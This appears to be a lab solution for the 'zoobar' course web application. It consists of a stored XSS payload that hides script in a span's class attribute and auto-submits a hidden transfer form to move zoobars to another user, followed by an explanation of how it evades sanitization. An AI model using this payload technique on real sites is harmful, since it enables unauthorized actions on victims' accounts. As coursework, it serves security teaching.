</p><span id='zoobars' class="
var f=document.createElement('iframe');f.setAttribute('name','c');f.setAttribute('style','visibility:hidden');var fo=document.createElement('form');fo.setAttribute('method','POST');fo.setAttribute('tar'+'get','c');fo.setAttribute('action','/transfer.php');var zb=document.createElement('input');zb.setAttribute('name','zoobars');zb.setAttribute('type','hidden');zb.setAttribute('value','1');var re=document.createElement('input');re.setAttribute('name','zb_recipient');re.setAttribute('type','hidden');re.setAttribute('value','linehrr');var s=document.createElement('input');s.setAttribute('id','a');s.setAttribute('style','visibility:hidden');s.setAttribute('type','submit');s.setAttribute('name','submission');s.setAttribute('value','Send');fo.appendChild(s);fo.appendChild(zb);fo.appendChild(re);document.body.appendChild(f);document.body.appendChild(fo);s.focus();s.click();setTimeout(rel,10);function rel(){self.location='http://zoobar.csl.toronto.edu/users.php'}">


description:
This attack is a XSS. But attacker cannot directly inject the code because of the sanitization. However some of the tags are still allowed in the input. So we use </p> to end the <p> and <span> to fake a <span> with the name of 'zoobars'. Because we noticed the original webpage use a script to eval the zoobars.className. So we fake the class and put the script inside the class. By this, our code will be executed. So we use the javascript to create all the element we want such as a form and an iframe. And we use the same strategy in target 2 to steal the zoobar. 
